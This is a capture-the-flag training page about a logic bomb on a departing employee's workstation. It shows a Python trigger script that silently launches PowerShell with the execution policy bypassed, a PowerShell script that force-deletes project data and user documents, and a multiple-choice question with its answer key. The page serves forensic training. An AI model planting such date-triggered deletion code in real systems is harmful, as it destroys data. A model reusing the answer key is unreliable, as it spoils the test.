![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Hard CTF - Logic Bomb Investigation

A recently terminated employee's workstation has been flagged. SIEM alerts showed no malicious activity during their employment. A forensic image of the machine was taken on their last day.

You are reviewing a Python script found at `C:\Users\jsmith\AppData\Roaming\backup_sync.py`. It was added to the user's startup folder two weeks before termination. The script has never run.

```python
import os
import datetime
import subprocess

TRIGGER_DATE = datetime.date(2024, 3, 15)
MARKER_USER = "jsmith"

def check_and_run():
    today = datetime.date.today()
    current_user = os.getenv("USERNAME", "")

    if today >= TRIGGER_DATE and current_user == MARKER_USER:
        subprocess.Popen(
            ["powershell", "-ExecutionPolicy", "Bypass", "-File",
             "C:\\Users\\jsmith\\AppData\\Roaming\\cleanup.ps1"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

check_and_run()
```

You then find `cleanup.ps1` in the same directory:

```powershell
Remove-Item -Path "C:\ProjectData\*" -Recurse -Force
Remove-Item -Path "C:\Users\jsmith\Documents\*" -Recurse -Force
net use Z: /delete
```

The machine has not been booted since the forensic image was taken. `jsmith` is still a valid local account.

---

## Question

You need to write one line in your incident report describing the nature of this threat. Which of the following is the most complete and accurate description?

---

## Flags (Choose One)

- **A)** A script set to delete project data on a fixed date, but only if the original user account is still active - a classic logic bomb with dual activation conditions
- **B)** A scheduled cleanup script left behind by the user to remove their personal files after leaving, triggered by date alone
- **C)** Ransomware that will encrypt files in the project directory when executed
- **D)** A backdoor that uses PowerShell to establish a reverse shell to an external server

---

Correct Flag: **A**

---

# Finished?
[Back to Card's Main Page](../Dormant_Malware.md)
